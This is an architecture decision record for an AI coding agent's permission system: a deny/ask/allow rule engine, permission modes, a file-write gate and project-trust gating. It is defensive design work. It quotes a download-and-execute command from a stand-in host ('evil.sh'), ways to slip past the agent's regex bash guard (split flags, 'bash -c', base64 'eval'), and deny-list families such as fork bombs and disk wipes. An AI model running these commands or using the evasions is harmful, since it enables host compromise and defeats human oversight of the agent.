# ADR 0019: Permission Rule Engine, Modes, and File-Write Gate

## Status

Accepted (2026-07-29) · Implemented (Tasks 1–10 of the execution plan)

> **MCP note:** MCP permission decisions in this ADR are superseded by
> [ADR 0033](./0033-mcp-supervisor-architecture.md). MCP is outside the
> permission rule engine; the material below is retained as historical context
> for the original implementation and migration.

### Implementation notes

**Built (Tasks 1–10):**

- **Rule engine** (`packages/agent-host/src/permission-rule-engine.ts`) — pure
  `evaluateRules` with deny→ask→allow, first-match-wins. Matchers: `matchBashGlob`
  (glob with `*`, plus `re:` regex prefix for bundled precision),
  `matchPathGlob` (`*` within a segment, `**` across segments), and
  `matchHostGlob`. Contracts in
  `packages/contracts/src/permission.ts` (`PermissionRuleTarget` vs
  `PermissionSubject` kept distinct; `PermissionRulesFile` `version: 1`;
  `PermissionConfig { mode }`; `mergeRuleSets`).
- **Bundled defaults** (`permission-defaults.ts`) — non-regression baseline:
  every prior `DENY_PATTERNS` → bundled deny, every prior `ASK_PATTERNS` →
  bundled ask, plus safe-prefix allowlist. File-write deny for secret paths,
  `~/.config/**` ask. `~` expanded to `homedir()` in `createBundledRuleSet`.
- **Trust-aware loader** (`permission-rule-loader.ts`) — loads user global +
  project shared/local, validates `version: 1`, drops malformed rules with a
  warning, strips project-layer `allow` when untrusted.
- **File-write gate** (`gated-file-tools.ts`) — wraps Pi `write`/`edit` via
  injected local operations; realpath-resolves, checks remembered allowlist,
  evaluates rules, prompts on ask. Both `writeFile` and `mkdir` gated.
- **Bash gate** (`gated-bash-tool.ts`) — delegates to `evaluateBashPermission`
  which runs the rule engine then applies the mode-aware unmatched default.
- **MCP boundary (historical)** — the former `mcp-call-permission.ts` path is
  removed by ADR 0033; risk classification/redaction may remain only as
  display diagnostics and never enter this rule engine.
- **Permission modes + bypass guard** — `resolveBypassGuard` in `sdk-adapter.ts`
  refuses `bypass` for untrusted projects (downgrades to `auto` + `host/log`).
  Non-interactive `ask` → `deny` via `resolveNonInteractiveDecision`.
- **Remember scope extended** — `ProjectRecord.bashAllowlist` (exact match) and
  `fileWriteAllowlist` (path-safe prefix) in `packages/project`; revoke +
  `listRememberedPermissions` extended.
- **CLI flags** (`apps/cli/src/permission-mode-override.ts`) —
  `--permission-mode <auto|ask-all|bypass>` and
  `--dangerously-bypass-permissions` alias (emits a stderr warning). Invalid
  `--permission-mode` throws a usage error.
- **Desktop UI** — Settings → Permissions mode switcher with trust-aware
  notices; context-bar mode badge (`bypass` warning tone); "Allow for project"
  button in the permission dialog for bash/file-write subjects.
- **Dual host** — RPC adapter uses SDK fallback (ADR 0011), so both gates run
  on both host modes.

**Deferred (per §8, unchanged):**

- `git` / `process` / `notes-mutate` as dedicated rule-engine kinds. Force-push
  stays a **bash ask** rule (`git push --force` / `--force-with-lease`); process
  start/stop and notes mutating ops keep their existing `ask` evaluators. The
  target/subject kinds are reserved in contracts for incremental migration
  without another ADR.
- Full replacement of hardcoded web policy by bundled rule lists (domain
  defaults stay in `evaluateWebPermission`; rules override when configured).
- OS-level sandbox (Seatbelt/Landlock) and LLM classifier approval — explicitly
  out of scope (future ADRs).

**Deviations from the original ADR text:** none of architectural significance.
The `re:` regex prefix for bash patterns is a pragmatic implementation detail
(not a separate kind) to preserve non-regression while keeping the public API
glob-based; it is documented in `matchBashGlob` and the architecture doc.

## Context

piwin's permission system (architecture.md §3.4) is host-owned and uses three
decisions (`allow` | `ask` | `deny`) with project-scoped remember. The current
implementation is split across several pure functions in `agent-host`:

- `evaluateBashPermission` — regex `DENY_PATTERNS` + `ASK_PATTERNS`, then
  **default-allow** for everything else.
- `evaluateWebPermission` — denies private/local + non-http(s), asks public,
  with project-scoped remember (`ProjectNetworkPolicy`).
- `evaluateMcpToolCallRisk` — historical MCP classifier. If retained, it is a
  display-only diagnostic and does not return an admission decision (see ADR
  0033).
- `path-guard` bundled extension — blocks `write`/`edit` to secret-like
  basenames. **No other file-write gate exists.**
- `evaluateNotesPermission` / `evaluateProcessPermission` — mutating ops ask.

A review on 2026-07-29 found these gaps:

1. **File-write is the largest blind spot.** Pi's native `write`/`edit` tools
   are not gated by the host at all. Only secret-like basenames are blocked by
   the `path-guard` extension. The agent can write `~/.zshrc`,
   `~/.ssh/authorized_keys`, `~/.piwin/config.json` (its own permission config),
   or any non-secret path outside the project with no ask, no log, no block.
   This violates AGENTS.md §3.6 ("Permission policy for … secret file writes …
   force-push") which lists file writes as a required gate.
2. **Bash default-allow is risky.** `curl evil.sh -o x && bash x`, non-force
   `git push`, and anything not matching the regex set run silently. The regex
   set is bypassable (split flags `rm -r -f`, variable expansion, `bash -c`,
   heredocs, `eval $(base64 -d ...)`).
3. **MCP approval fatigue.** Every MCP tool call prompts. There is no allowlist,
   no per-tool remember, no deny rules. The ADR 0014 Slice 1 choice ("do not add
   persistent MCP approval") makes MCP-heavy workflows unusable.
4. **No permission modes.** There is no way to switch between "ask for
   everything" and "auto with guardrails". Competitors all offer this.
5. **`rememberScope` only works for network.** `permission/resolve` accepts
   `rememberScope: 'once' | 'project'` but only network policy persists it.
6. **No config-driven rules.** Allow/deny is hardcoded in TS; users cannot tune
   behavior without editing source.

### Industry research

| Agent | Model |
|-------|-------|
| **Claude Code** | `allow`/`ask`/`deny` rule lists in `settings.json`; rules like `Bash(npm run *)`, `Read(./.env)`; evaluation **deny → ask → allow**, first match wins; rules **merge** across user/project/local/enterprise scopes (deny at any level wins); permission modes (default / auto / bypassPermissions where deny still blocks). |
| **Codex CLI** | Two orthogonal axes: **sandbox mode** (read-only / workspace-write / danger-full-access, OS-enforced via Seatbelt/Landlock) + **approval policy** (when to ask); untrusted dir → read-only, trusted → workspace-write; Starlark `prefix_rule` execution policies evaluated before sandboxing. |
| **Cursor** | Run Modes: Ask / Auto-review / Allowlist / Allowlist+Sandbox / Run Everything; Auto-review = allowlist → sandbox → LLM classifier; `permissions.json` with `terminalAllowlist` (prefix match), `mcpAllowlist`, `autoRun` NL guidance. |

Consensus: deny-first rule evaluation, allowlist to cut fatigue, modes for
autonomy level, sandbox as a technical boundary separate from approvals,
project trust influencing defaults.

### Product direction (user decisions 2026-07-29)

- **Default mode `auto`**, targeting a Cursor-like low-friction experience
  ("almost never asks").
- **File-write**: project-internal → allow, project-external → ask, secret
  paths → deny.
- **MCP**: removed from this permission system by ADR 0033. The configured
  server is the user's trust boundary; MCP calls do not prompt or consult
  these rules.
- OS-level sandboxing (Codex Seatbelt/Landlock) and LLM classifier approval
  (Cursor Auto-review) are explicitly **out of scope** for this ADR; the rule
  engine is an approval-layer guard, not a sandbox. This honesty follows ADR
  0014's "MCP is not a sandbox" wording.

## Decision

### 1. Unified rule engine (host-owned, pure function)

Replace the scattered hardcoded pattern lists with a single pure-function rule
engine in `@piwin/agent-host` (`permission-rule-engine.ts`). Rule structure
lives in `@piwin/contracts` so apps can render/edit it:

```ts
/** Pattern side — what a rule matches. */
export type PermissionRuleTarget =
  | { kind: 'bash'; pattern: string }        // glob over command string
  | { kind: 'file-write'; pathGlob: string } // glob over resolved absolute path
  | { kind: 'web-fetch'; hostGlob: string }
  | { kind: 'web-search' }
  | { kind: 'git'; pattern: string }
  | { kind: 'process' }
  | { kind: 'notes-mutate' };

/**
 * Runtime subject — what is being evaluated.
 * Kept separate from PermissionRuleTarget so pathGlob/pattern are not
 * overloaded with concrete path/command strings.
 */
export type PermissionSubject =
  | { kind: 'bash'; command: string }
  | { kind: 'file-write'; path: string }     // resolved absolute path
  | { kind: 'web-fetch'; host: string }
  | { kind: 'web-search' }
  | { kind: 'git'; command: string }
  | { kind: 'process' }
  | { kind: 'notes-mutate' };

export type PermissionRule = {
  target: PermissionRuleTarget;
  /** Must match the bucket the rule is stored in (deny/ask/allow). */
  decision: 'allow' | 'ask' | 'deny';
  reason: string;
};

export type PermissionRuleSet = {
  deny: PermissionRule[];
  ask: PermissionRule[];
  allow: PermissionRule[];
};

/** On-disk file shape (user global + project shared/local). */
export type PermissionRulesFile = {
  version: 1;
  deny?: PermissionRule[];
  ask?: PermissionRule[];
  allow?: PermissionRule[];
};
```

Evaluation order: **deny → ask → allow**, first match wins (Claude Code
semantics). Specificity does **not** change order: a broader bundled `ask`
beats a more specific user `allow` (tiers are ordered, not specificity-ranked).
No match → fall through to the domain default (§3).

Engine API:

```ts
evaluateRules(input: {
  subject: PermissionSubject;
  rules: PermissionRuleSet;
}): 'allow' | 'ask' | 'deny' | 'no-match'
```

A bare deny on a tool kind removes the tool from the agent's context where the
host controls registration (bash, file-write, process, notes); for Pi-native
tools the host wraps `execute` / `operations` and refuses.

### 2. Layered rule sources (merge, not override)

Rules merge across layers; **deny at any layer beats allow at any layer**
(because evaluation is deny-first, then ask, then allow):

1. **Bundled defaults** (`permission-defaults.ts`) — safety baseline, ships
   with the product. Its `deny` and `ask` rules cannot be allowed away by lower
   layers (tier order).
2. **User global** — `~/.piwin/permissions.json` (separate file, same pattern
   as `~/.piwin/mcp.json`). Full deny/ask/allow.
3. **Project shared** — `<project>/.piwin/permissions.json` (checked in).
4. **Project local** — `<project>/.piwin/permissions.local.json` (gitignored;
   host/docs should document ignoring this file; scaffold when present).

#### Trust-aware project allow rules (security)

A checked-in project `permissions.json` must not be able to weaken
cross-boundary defaults (e.g. `allow` for `file-write` `/**` or bash `*`).

| Layer | deny | ask | allow |
|-------|------|-----|-------|
| Bundled | always | always | always |
| User global (`~/.piwin`) | always | always | always |
| Project shared (`.piwin/permissions.json`) | always | always | **only if project is trusted** |
| Project local (`.piwin/permissions.local.json`) | always | always | **only if project is trusted** |

When the project is **untrusted** (or there is no project / general scope has
no project record), project shared/local **allow** arrays are dropped at load
time (warn once in `host/log`). Project deny/ask still apply — a repo can
only make the agent *more* cautious, not *less*, until the user trusts it.

User-global allow rules always apply (the user's machine, their choice).

The **permission mode** (`auto` / `ask-all` / `bypass`) lives in
`PiwinConfig.permissions.mode` inside `~/.piwin/config.json` — it is a simple
scalar setting that fits alongside other config. **Rules** live in the separate
`permissions.json` files above, not in `config.json`. This separation mirrors
the existing `mcp.json` vs `config.json` split and keeps `config.json` small.

`PermissionConfig` in `PiwinConfig` is therefore:
```ts
export type PermissionConfig = {
  mode: PermissionMode;  // 'auto' | 'ask-all' | 'bypass'
};
```
Rule files are loaded by the host at **session create** and merged with bundled
defaults. The merged `PermissionRuleSet` is an in-memory construct, not
persisted — persistence is per-layer in the respective `permissions.json`.
Mid-session edits to rule files or mode take effect on the **next session**
(document in Settings; no hot-reload in this ADR).

`~` in path globs is expanded when materializing rules in the loader (to
`os.homedir()`), so the pure matcher only sees absolute patterns.

This keeps the single config root rule (AGENTS.md §1.7): product permission
state under `~/.piwin`, project-shared under the project's `.piwin/`.

### 3. Permission modes

`PiwinConfig.permissions.mode: PermissionMode` (new), with
`PermissionMode = 'ask-all' | 'auto' | 'bypass'`:

| Mode | bash unmatched | file-write in-project | file-write out-of-project | network public | deny rules |
|------|----------------|----------------------|--------------------------|----------------|------------|
| `ask-all` | ask | ask | ask | ask | always enforced |
| `auto` (default) | allow¹ | allow | ask | ask | always enforced |
| `bypass` | allow | allow | allow | allow | **still enforced** |

The table above applies when the configured mode is in force. For **untrusted**
projects (§7), `bypass` is refused (downgraded to `auto`). Domain defaults for
out-of-project file-write and network are already **ask** in `auto`, so
untrusted does not further change those two cells; the real untrusted
tightening is: **no project allow rules** (§2) + **bypass refused**.

¹ `auto` bash unmatched → allow **only after** bundled deny **and** bundled
ask rules. Migration is non-regressive: every current `DENY_PATTERNS` entry
becomes a bundled deny rule; every current `ASK_PATTERNS` entry becomes a
bundled ask rule (see §3.1). Expanded patterns may add additional deny/ask
entries. A built-in **safe-prefix allowlist** (`ls`, `cat`, `git status`,
`pnpm test`, …) is bundled as `allow` rules so they are visible and editable
(useful mainly under `ask-all`).

`bypass` requires explicit opt-in (`config.permissions.mode = 'bypass'` or CLI
`--dangerously-bypass-permissions`); the host refuses `bypass` for untrusted
projects and logs a warning. **General scope** (no project) may use bypass —
it is the user's machine. **Deny rules are the only guard in bypass** — this
matches Claude Code's `bypassPermissions` semantics and is the honest contract.

Non-interactive CLI: `ask` resolves to `deny` (existing
`resolveNonInteractiveDecision`); `bypass` still requires the explicit flag.

#### 3.1 Bundled bash defaults (non-regression baseline)

Must preserve today's decisions for these families (golden tests):

**Deny (from current `DENY_PATTERNS`, plus documented expansions):**

- pipe-to-shell, wget-pipe-shell, mkfs, disk-destroy (dd→/dev), rm-root,
  fork-bomb, shutdown, curl-eval
- expansions: split-flag `rm -r -f` / `rm -fr` forms that target root-like
  paths; `chmod -R 777` (promoted from ask → deny for the recursive-777 form)

**Ask (from current `ASK_PATTERNS` — must not silently become allow in `auto`):**

- `rm` recursive-force (e.g. `rm -rf`, `rm -fr`) not already hard-denied
- `sudo`
- `git push` with `--force` / `--force-with-lease` (git kind remains deferred
  as a separate target; these stay **bash ask** rules so behavior is unchanged)
- writes toward `.env` via shell tools (`tee`/`cp`/`mv`/`echo`/`cat` patterns)
- `chmod 777` (non-recursive / remaining forms not covered by deny)

**Allow (visible safe prefixes):** `ls *`, `cat *`, `head *`, `tail *`,
`grep *`, `rg *`, `git status`, `git diff *`, `git log *`, `pnpm test`,
`pnpm typecheck`, `npm test` (and equivalents as implemented).

Implementers must not "adjust" existing `permission-policy.test.ts` cases from
ask→allow to make the suite green. New mode-aware tests are additive.

### 4. File-write gate (closes the biggest gap)

New `evaluateFileWritePermission` pure function + `gated-file-tools.ts` that
wraps Pi's `write`/`edit` tools (same shape as `gated-bash-tool.ts`).

Pi API (verified on `@earendil-works/pi-coding-agent@0.80.10`):

- `createWriteToolDefinition(cwd, { operations?: WriteOperations })`
- `createEditToolDefinition(cwd, { operations?: EditOperations })`
- `WriteOperations`: `{ writeFile, mkdir }`; `EditOperations`:
  `{ readFile, writeFile, access }`
- There is **no** exported `createLocalWriteOperations` /
  `createLocalEditOperations` (unlike `createLocalBashOperations`). The gate
  implements thin local ops with `fs/promises` **after** permission checks.

- **deny**: secret-like paths (migrate `path-guard` basename patterns into the
  rule engine so they are configurable), `~/.piwin/**` (agent cannot edit its
  own permission config), `~/.ssh/**` (bundled deny rules). `~/.config/**` is
  **ask**, not deny — users may legitimately want the agent to edit
  `~/.config/git/ignore` or `~/.config/devin/`; a blanket deny would be too
  aggressive. Note: because ask beats allow by tier, a more specific user
  allow for `~/.config/git/**` does **not** override the bundled ask unless we
  later add specificity ranking (out of scope; document in UI).
- **ask**: paths outside the project root (in `auto` and `ask-all`), plus
  `~/.config/**` (sensitive but sometimes legitimate).
- **allow**: paths inside the project root (in `auto`); in `ask-all` project
  writes still ask unless an `allow` rule matches.
- **Gate both `writeFile` and `mkdir`**: recursive mkdir can create trees
  outside the project before a write; evaluate the directory path as a
  file-write subject as well.
- Path resolution: the caller (`gated-file-tools.ts`) does `realpath` before
  invoking the pure evaluator (ENOENT for new files → use pre-realpath
  absolute path); `evaluateFileWritePermission` itself stays pure
  (string-based path normalization + `path.relative` check, reusing the `..` /
  `relative-to-root` logic from `project-commands.ts`, extracted into
  `@piwin/project` as a shared helper). Symlink-aware realpath is the caller's
  responsibility so the policy function remains unit-testable without FS.

`path-guard` extension stays as a **defense-in-depth second layer** (Pi
extension layer still blocks secret basenames), but the primary gate moves to
the host rule engine so it is configurable, testable, and rememberable.

### 4.1 Workspace boundary: ask, never silently refuse (2026-09-24)

Product owner decision: when the agent wants to operate outside the space it
was given, it asks the user. It never hard-fails in a way only the model sees.

**Boundary.** The session's bound workspace root (project path, or the worktree
the session runs in), plus directories the user granted for this session.
Paths are compared by their real path on both sides, so a project registered
through a symlink (`/Volumes/…/piwin` → `~/Developer/piwin`) still covers a cwd
spelled through its target. General sessions with no bound root have no
boundary gate (unchanged).

**What crosses it, and what happens:**

| Crossing | `auto` / `ask-all` | `bypass` (YOLO) |
|----------|--------------------|-----------------|
| `write` / `edit` to a path outside the boundary | ask | **ask** (was allow) |
| Background Job (`process_start`) with a cwd outside the boundary | ask | **ask** (was a hard refusal from the Job registry's trusted-project check) |
| Browser upload containing any file outside the boundary | ask | **ask** |
| Browser screenshot saved outside the boundary | ask | **ask** |
| `bash` whose arguments reference outside paths (lexical heuristic) | ask (unchanged) | allow (unchanged) |

The bash heuristic is intentionally not promoted into YOLO: it matches any
non-`cd/ls/cat/echo` program with an outside operand (`rg foo /usr/include`),
which would turn YOLO into constant prompting. Writing files, running
long-lived processes elsewhere, and uploading local files from another space
warrant an explicit decision.

Circuit breakers are unchanged and still win: secret paths deny with no
prompt, `deny` rules deny, and no grant can widen them.

**Answers on the prompt:**

- *Allow once* — this call only.
- *Allow for session* — for a Job, the cwd directory (and everything under it)
  joins this session's boundary; for a file write, screenshot, or upload,
  the approved path or paths are remembered. In-memory, cleared with the session.
- *Deny* — the tool fails with a reason that names the boundary, so the model
  can explain or choose another path instead of guessing.

A session grant is **not** project trust: the granted directory's
`.piwin/permissions.json` and YOLO settings still do not apply. Trust stays an
explicit Settings action.

Non-interactive callers (CLI `-p`, schedules) cannot answer, so a boundary ask
resolves to deny with the same reason. Subagent asks route to the parent
session's user as before.

**Job registry.** The trusted-project check stays for clients that start Jobs
directly (`job/start`). The model-facing `process_start` tool passes the cwd it
was admitted with as a Host-internal extra root — never through the public
`StartJobInput`, so a client cannot use it to skip the check.

### 5. MCP boundary (superseded by ADR 0033)

MCP is outside this permission ADR. The configured server is the user's trust
boundary, so MCP calls do not prompt and do not consult the rule engine.

- `mcp-call-permission.ts` is removed from the execution path.
- Argument redaction and risk classification may remain for logs/UI, but are
  informational only.
- MCP permission targets, subjects, mode-table columns, and policy paths are
  removed from contracts and admission code.
- Legacy MCP rules in `permissions.json` are ignored without migration,
  upgrade, blocking, or prompting.

The lifecycle, process ownership, config replacement, gateway exposure, and
cooldown semantics are defined by [ADR 0033](./0033-mcp-supervisor-architecture.md).
The risk remains explicit: an enabled MCP server runs with the Host user's OS
permissions and is not sandboxed by piwin's permission layer.

### 6. Remember scope extended to bash and file-write

`permission/resolve` `rememberScope: 'project'` now persists for:

- **bash**: `ProjectRecord.bashAllowlist: string[]`. Store the **full command
  string** from the permission detail. At check time use **exact match only**
  (after trim). Naive string prefix is forbidden — approving
  `rm -rf /tmp/foo` must not auto-allow `rm -rf /tmp/foo /etc` or
  `rm -rf /tmp/foobar`. Broader reuse goes through `permissions.json` globs.
- **file-write**: `ProjectRecord.fileWriteAllowlist: string[]` (absolute
  paths). Store the resolved absolute path of the approved write. At check
  time match with **path-safe prefix**:
  `path === stored || path.startsWith(stored + path.sep)` (normalize both
  sides first). Approving `/home/user/external/config.toml` remembers that
  exact file; approving a directory path (trailing semantics: store without
  forcing a trailing sep, match via `+ sep`) allows children only when the
  stored entry is a real path prefix with a separator boundary — never
  `/home/u/a` matching `/home/u/ab`.
- **network**: unchanged (`allowedFetchHosts`, `allowWebSearch` — exact host).

MCP has no permission remember/revoke entry because it is outside this rule
engine. Revoke flow (`project/permissions-revoke`) extends to the bash and
file-write keys. `listRememberedPermissions` surfaces those in Settings.

The `permission/resolve` handler needs the permission request's `context.kind`
to branch correctly. Currently `pendingPermissions` stores `action` and
`detail` but not `context`; the implementation must either store `context`
alongside or re-derive it via `buildPermissionRequestContext(action, detail)`
at resolve time. The latter is simpler and avoids duplicating the context
struct. When extracting a bash command from `detail` shaped as
`"<reason>: <command>"`, prefer a structured detail field if available;
otherwise split on the **first** `": "` and take the remainder (reasons must
not embed `": "` — use existing reason tokens without colons+space).

### 7. Project trust → mode gating

Reuses existing `ProjectTrustLevel` (`untrusted` | `trusted`) with no new
concept.

| Concern | Untrusted project | Trusted project |
|---------|-------------------|-----------------|
| `bypass` mode | **Refused** → effective `auto` + warn | Configured mode applies |
| Project-layer **allow** rules | **Dropped** at load (§2) | Loaded |
| Out-of-project file-write / public network in `auto` | ask (same as trusted `auto`) | ask |
| In-project writes + safe bash / unmatched bash in `auto` | allow (agent must stay usable) | allow |

Honest framing: untrusted is **not** a full Codex read-only sandbox. It blocks
bypass and untrusted project allow rules. Cross-boundary actions already ask in
`auto` for both trust levels.

### 8. Scope: what migrates to the rule engine now vs later

**Migrates now (this ADR) — full rule-engine path + bundled defaults:**

- **bash** — deny/ask/allow rules + mode-aware unmatched default
- **file-write** — gate + rules + domain defaults

MCP is explicitly excluded from this rule-engine scope; see ADR 0033 for
configuration trust, Supervisor lifecycle, and display-only diagnostics.

**Partial this ADR:**

- **web-fetch / web-search** — `PermissionRuleTarget` / `PermissionSubject`
  kinds exist; user/project rules can deny/ask/allow via the engine when
  present. **Domain defaults stay in `evaluateWebPermission`** (private/local
  deny, public ask, scheme checks) unless an explicit rule matches first.
  Full replacement of hardcoded web policy by bundled rule lists is a
  follow-up; no behavior regression required beyond "rules can override when
  configured."

**Stays as-is for now:**

- **git** as a dedicated kind — force-push remains covered by **bash ask**
  rules (§3.1), not a separate git tool gate. `git` target kind is reserved
  in contracts for later.
- **process** (start/stop always ask), **notes** (mutating ops ask) — code
  paths unchanged; kinds reserved in contracts.

They can be migrated incrementally in follow-up PRs without another ADR (types
already in place).

### 9. Dual host modes

File-write gate, bash gate, rule loading, and mode must apply on every path
that today registers gated bash (SDK session create and any RPC→SDK fallback
that builds the same custom tools). Apps never import Pi; only
`@piwin/agent-host` wires tools. Do not ship SDK-only permission behavior.

## Consequences

- **File writes are now gated.** Agents that previously wrote freely outside
  the project will now prompt (in `auto`/`ask-all`) or be denied (secrets).
  This is the intended safety improvement; some existing workflows will see new
  prompts for out-of-project writes.
- **MCP workflows stop prompting.** Heavy MCP use becomes viable; the tradeoff
  is that server choice is the security boundary.
- **`auto` default keeps bash low-friction** but unmatched allow only applies
  after deny **and** ask rule tiers. Glob/regex matching is not shell-semantic
  analysis and can still be bypassed by a determined prompt; `ask-all` is the
  recommended mode on machines with sensitive material.
- **Ask beats allow by tier.** Users cannot allow-away bundled ask (e.g.
  `~/.config/**`) with a more specific allow rule; they must remove/override
  via a future editor that edits the ask list, or use a higher-privilege path
  (not offered). Document in Settings.
- **Untrusted projects** cannot ship allow rules that weaken the agent; they
  can only add deny/ask.
- **Config surface grows**: `permissions.json` (user/project/local, `version: 1`)
  + first-tier Settings. New user-visible config path under `~/.piwin`.
- Rule engine + layered merge + glob matching is new pure logic requiring
  golden unit tests (AGENTS.md §3.7), including non-regression for current
  bash deny/ask decisions and allowlist boundary cases.
- MCP permission behavior and the remaining MCP lifecycle details are governed
  by ADR 0033; ADR 0014 is retained only as historical context for the original
  gateway/lazy-connect direction.

## Alternatives considered

| Option | Why rejected |
|--------|--------------|
| Keep status quo (regex + default-allow, no file-write gate) | Leaves the largest blind spot open; bash default-allow unsafe; MCP unusable. |
| OS-level sandbox (Codex Seatbelt/Landlock) | Correct long-term answer but a large cross-platform engineering effort (per-platform kernel in the Tauri sidecar). Deferred to a future ADR; this ADR is the approval layer. |
| LLM classifier approval (Cursor Auto-review) | Adds nondeterminism, latency, and an online dependency. piwin is local-first. `auto` mode uses a pure-function risk classifier for now; LLM classifier is a future plugin point. |
| Per-tool MCP remember (original proposal) | User explicitly chose server-level trust instead: "once MCP is started, give full permission." Simpler and matches how users think about MCP servers. |
| `ask-all` as default | User chose `auto` for Cursor-like low friction. `ask-all` remains available. |
| Fork Pi core to gate native tools | Violates AGENTS.md §1.4 (adapters over forks). Host wraps `execute`/`operations` instead. |
| Naive string-prefix project remember | Approving `rm -rf /tmp/foo` would allow `rm -rf /tmp/foo /etc`. Rejected; exact (bash) / path-safe prefix (files). |
| Load all project allow rules regardless of trust | Malicious checked-in `permissions.json` could allow `/**` writes. Rejected; allow only when trusted. |

## Open questions / follow-ups

- OS sandbox ADR (future): when Tauri sidecar bundling (ADR 0017) matures,
  evaluate Seatbelt/Landlock to make `auto` mode's bash allow-list-less commands
  run in a real workspace-write sandbox instead of relying on deny patterns.
- LLM classifier plugin point: `auto` mode's risk classifier interface should
  be designed so an LLM-based classifier can be slotted in later without
  changing the rule engine.
- Full rule editor GUI in Desktop Settings: the implementation plan ships a
  first-tier UI (mode switcher, extended remember, remembered-permissions list,
  trust→mode hint, mode badge). A full visual rule editor (add/edit/remove
  rules with glob autocomplete) is a follow-up; until then users edit
  `permissions.json` by hand or via the agent itself.
- Specificity-ranked rules (optional): allow a more specific allow to beat a
  broader ask within the same product — requires ordered lists or score; not
  in this ADR.
- Full web policy as bundled rules only (drop special-case private-host logic
  into deny globs) — follow-up once host-glob semantics for IP ranges are clear.
- Session hot-reload of mode/rules — out of scope; next session only.
